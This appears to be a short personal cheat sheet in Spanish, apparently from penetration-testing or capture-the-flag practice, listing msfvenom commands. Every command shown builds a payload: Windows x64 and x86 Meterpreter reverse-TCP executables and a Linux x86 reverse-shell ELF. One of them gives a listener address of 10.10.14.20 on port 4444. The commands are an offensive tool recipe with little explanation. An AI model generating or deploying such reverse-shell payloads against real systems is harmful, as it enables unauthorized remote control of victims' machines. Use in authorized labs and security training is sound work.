msfvenom -l payloads

(ejemplo) --> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x LPORT=x -f exe > payload.exe

si es de 32 bits el exploit ya apunta directamente solo hay que especificar si es de 64bits 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f exe -o payload.exe


msfvenom -p linux/x86/shell_reverse_tcp LHOST=x LPORT=x -f elf > shell.elf 

